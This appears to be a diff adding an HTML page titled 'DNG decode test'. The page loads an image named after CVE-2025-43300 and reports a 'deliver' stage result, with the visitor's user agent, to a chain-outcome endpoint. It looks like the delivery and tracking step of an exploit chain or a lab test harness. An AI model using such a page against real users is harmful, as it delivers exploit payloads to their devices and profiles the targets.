@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>DNG decode test</title></head>
+<body style="margin:0;background:#111">
+<img src="cve-2025-43300.dng" alt="dng" style="max-width:100%">
+<script>
+fetch('/api/chain-outcome', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    chain: 'cve-2025-43300',
+    stage: 'deliver',
+    result: 'image-loaded',
+    ua: navigator.userAgent
+  })
+}).catch(function(){});
+</script>
+</body>
+</html>
